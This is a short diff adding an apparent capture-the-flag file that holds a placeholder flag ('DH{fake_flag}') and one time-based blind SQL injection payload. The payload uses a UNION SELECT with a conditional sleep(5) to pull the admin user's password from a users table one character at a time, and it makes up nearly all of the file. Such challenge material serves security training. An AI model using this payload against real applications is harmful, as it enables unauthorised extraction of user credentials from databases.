@@ -1,0 +1,4 @@
+DH{fake_flag}
+
+
+union select 1,'2','3','4',if(substring((select password from users where username='admin'),1,1)='t',sleep(5),'5')-- -\
